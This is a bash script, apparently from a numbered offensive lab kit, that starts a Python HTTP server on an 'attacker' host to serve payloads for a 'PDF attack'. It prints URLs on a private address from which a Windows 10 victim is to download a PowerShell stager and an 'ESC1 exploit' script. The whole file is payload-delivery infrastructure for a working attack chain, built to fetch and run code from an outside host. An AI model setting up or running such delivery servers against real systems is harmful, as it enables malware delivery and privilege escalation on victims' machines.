#!/usr/bin/env bash
# Setup HTTP server on attacker to host payloads for PDF attack

PORT=8080
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] Starting HTTP server on port $PORT for payload delivery..."
echo "[*] Serving from: $SCRIPT_DIR"
echo "[*] Access from Win10: http://192.168.58.50:$PORT/"

cd "$SCRIPT_DIR"

# Start Python HTTP server in background
python3 -m http.server $PORT > /tmp/http_server.log 2>&1 &
SERVER_PID=$!

echo "[*] Server PID: $SERVER_PID"
echo "[*] Logs: /tmp/http_server.log"
echo ""
echo "Available files:"
echo "  - http://192.168.58.50:$PORT/05-powershell-stager.ps1"
echo "  - http://192.168.58.50:$PORT/06-esc1-exploit.ps1"
echo ""
echo "To stop: kill $SERVER_PID"
